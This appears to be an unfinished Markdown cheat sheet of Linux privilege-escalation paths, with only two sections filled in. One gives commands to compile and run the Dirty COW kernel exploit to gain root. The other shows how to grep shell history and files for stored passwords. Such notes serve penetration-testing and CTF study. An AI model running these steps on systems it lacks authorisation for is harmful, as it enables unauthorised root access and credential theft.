# Escalation Paths

1. [Kernel Exploits](#kernel-exploits)
2. [Stored Passwords](#stored-passwords)
3. [File Permissions](#file-permissions)
4. [Sudo](#sudo)
5. [SUID](#suid)
6. [Capabilities](#capabilities)
7. [Scheduled Tasks](#scheduled-tasks)
8. [NFS Root Squashing](#nfs-root-squashing)
9. [Docker](#docker)

## Kernel Exploits

* [Repo for common kernel exploits](https://github.com/lucyoa/kernel-exploits)

```shell
uname -a
#Google or searchsploit the version
#get exploit code

#we can also use linux-exploit-suggester
./linux-exploit-suggester.sh

#dirty cow exploit
gcc -pthread c0w.c -o cow
#creates executable for exploit

./cow
#privesc

passwd
#elevates user to root
```

## Stored Passwords

```shell
history

ls -la

cat .bash_history
#check for passwords

su root
#use root password

#for stored passwords
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
#check for passwords in current dir

#check using automated tools such as linpeas.sh
```

## File Permissions

## Sudo

## SUID

## Capabilities

## Scheduled Tasks

## NFS Root Squashing

## Docker
